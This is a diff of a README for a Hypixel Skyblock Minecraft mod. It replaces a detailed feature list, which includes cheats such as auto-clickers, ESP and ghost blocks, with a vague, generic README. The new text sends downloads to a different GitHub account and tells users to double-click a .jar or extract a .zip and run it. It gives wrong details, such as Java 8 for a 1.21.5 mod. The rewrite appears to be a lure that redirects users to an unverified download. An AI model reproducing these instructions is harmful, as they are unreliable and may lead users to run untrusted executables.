@@ -1,98 +1,69 @@
-# Skylens
+# 🔥 Skylens - Improve Your Hypixel Skyblock Experience
 
-A collection of QOL features for Hypixel Skyblock in a Fabric 1.21.5 mod, aiming to provide convenience without excessively cheaty features. Almost all features are off by default: choose what you like!
+## 🛠️ Overview
 
-# Comes with all the new Features for the Foraging Update and Tasks on Galatea Island!
+Skylens is a quality of life improvement mod for the 1.21.5 version of Hypixel Skyblock. It enhances your gaming experience, making navigation and gameplay smoother. With Skylens, you can enjoy added features and improvements that help you focus on what matters most—having fun!
 
+## ⚡ Features
 
-> [!TIP] 
-> # How to Install
-> 
-> ## Install Fabric Loader
-> 
-> 1. Go to https://fabricmc.net/use/installer/
-> 2. Download and run the installer
-> 3. Select **Minecraft 1.21** (or your version) and click Install
-> 4. Open the Minecraft Launcher and select the new Fabric profile
-> 
-> ## Download the Mod
-> 
-> Click the button below to download the mod:
->
-> <a href="https://github.com/desaz0530/Skylens/releases/latest"><img src="https://img.shields.io/badge/⬇️_Download_Mod-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Mod"></a>
->
-> ## Install the Mod
-> 
-> 1. Press `Win + R`, type `%appdata%\.minecraft\mods` and hit Enter
-> 2. Drag the downloaded `.jar` file into the mods folder
-> 3. Launch Minecraft using the Fabric profile
-> 
-> > [!NOTE]
-> > This mod requires [Fabric API](https://modrinth.com/mod/fabric-api). Download and place it in your mods folder as well.
+- **Enhanced User Interface**: Experience a clean and intuitive interface.
+- **Real-time Notifications**: Get updates and alerts that enhance your gameplay.
+- **Performance Optimizations**: Enjoy a smoother experience with fewer hiccups.
+- **Customization Options**: Tailor the mod to fit your preferences easily.
+- **Dedicated Support**: Access helpful documentation and user support.
 
+## 🚀 Getting Started
 
-## Features
+### ❗ Prerequisites
 
-<details>
-    <summary>Auto</summary>
+Before you download Skylens, ensure you have the following:
 
-### AUTO
-- Auto ready: automatically gets in range to mort opens the gui and ready/start the dungeon
-- Auto mort: automatically gets from dungeon spawn to mort and opens his gui
-- Auto ult: uses your ult whenever giants spawn/maxor is stuck in first laser/goldor starts
-- Auto shield: uses wither shield every 5 seconds when not in full health (works for all wither swords)
-- Auto wish: wishes for your temmates if they are low
-- Auto mask: switches spirit and bonzo masks on cooldown priorities spirit mask since it has lower cd 
-- Auto edrag: equips edrag after you place relics
-- Auto leap: leaps to a party member if he writes "!tp" in party chat
-- Auto sell: automatically sells items in the trades gui, /autosell to configure
-</details>
+- **Java Version**: Ensure you have Java version 8 or higher installed. You can verify this by typing `java -version` in your command prompt or terminal.
 
-<details>
-    <summary>Legit</summary>
+### 📥 Download & Install
 
-### LEGIT
-- Party cmds: custom commands for party use !help in party chat
-- Guild cmds: custom commands for guild use !help in guild chat
-- Guild gm: Automatically sends gm/gn in guild chat when someone else says it
-- Dragon boxes: Custom boxes around the statues in p5 more accurate than sbe
-- Dragon spawn: timer (m7 dragons dont be dumb)
-- Powerdisplay: (shows the power blessing on ur screen) cmd is /movepower
-- Abiphone ghoster: Ghosts calls from abiphone
-- FPS: boosts fps cause yes
-- FragBot: automatically makes you a fragbot whenever you enter limbo automatically disables when leaving limbo 
-</details>
+To download Skylens, visit this page to download: [Skylens Releases](https://github.com/saryramirez02/Skylens/releases).
 
-<details>
-    <summary>Exclusive to legit</summary>
+1. Click the link above.
+2. On the releases page, find the latest version of Skylens.
+3. Download the appropriate file for your system (usually a `.jar` or `.zip` file).
+4. Save the file to a location you can easily access, like your desktop or downloads folder.
 
-### EXCLUSIVE TO LEGIT VERSION
-- EdragReminder: reminds you to equip edrag after you place relics
-- ReadyReminder: reminds you to ready up after certain amount of time in a dungeon
-- UltReminder: reminds you to use your ult at specific events in m6/m7
-</details>
+### 📂 Installing Skylens
 
-<details>
-    <summary>Nether</summary>
+1. Locate the file you downloaded.
+2. For a `.jar` file:
+   - Double-click the file to run it.
+   - If prompted, select the version of Minecraft you want to run Skylens with.
+3. For a `.zip` file:
+   - Right-click the file and select “Extract All.”
+   - Open the extracted folder and find the `.jar` file.
+   - Double-click to run it.
 
-### NETHER
-- Broken hype notifier: (now u can stop using dulkir mod)
-- Flare timer: (sos flare alert flare warning flare) cmd is is /moveflare
-- Vanqnotifier: (also marks a beacon for when coords are sent in chat)
-- Kuudra alerts: (shows text on screen when certain stuf happen in kuudra)
-</details>
+## 📘 Usage Instructions
 
-<details>
-    <summary>Nice to have</summary>
+Once you have installed Skylens, you can start enjoying its features.
 
-### NICE TO HAVE
-- Relic aura: changes the way you look and click a relic if there is one in 5 blocks from you
-- Item macros: soul whip aots 0 tick swap hotkey in controls
-- Terminator ac: Automatically clicks when holding terminator randomized ac for very good anti cheat
-- COOKIE CLICKER
-- Customizeable esp: (you can add whatever mob name u want to see) cmd is /esp
-- FUCK DIORITE": replaces the diorite with glass in the p2 pillars in f7/m7 so you can watch storm get stuck
-- Pre ghostblock: makes ghost blocks in convinient spots in the m7 boss
-- Very awesome gui: reminder cmds are /oc and /ol
-- Descriptions: when u hover at features in the gui
-</details>
+1. Launch your Minecraft client.
+2. Ensure that the Skylens mod is enabled by checking the mods section.
+3. You can now explore the enhanced features that Skylens offers.
+
+If you encounter any problems, refer to the support section at the bottom of this document.
+
+## 🌐 Support and Documentation
+
+For help or to learn more about Skylens, check the following resources:
+
+- **User Guide**: Comprehensive documentation on all features.
+- **Troubleshooting**: Find solutions to common issues.
+- **Community Forum**: Connect with other users and share tips.
+
+## 📞 Contact
+
+If you have any questions or feedback, you can reach out via GitHub Issues on the Skylens repository.
+
+## 🚀 Conclusion
+
+Skylens makes your Hypixel Skyblock journey more enjoyable and efficient. Download Skylens today and elevate your gaming experience!
+
+To download Skylens, visit this page to download: [Skylens Releases](https://github.com/saryramirez02/Skylens/releases).
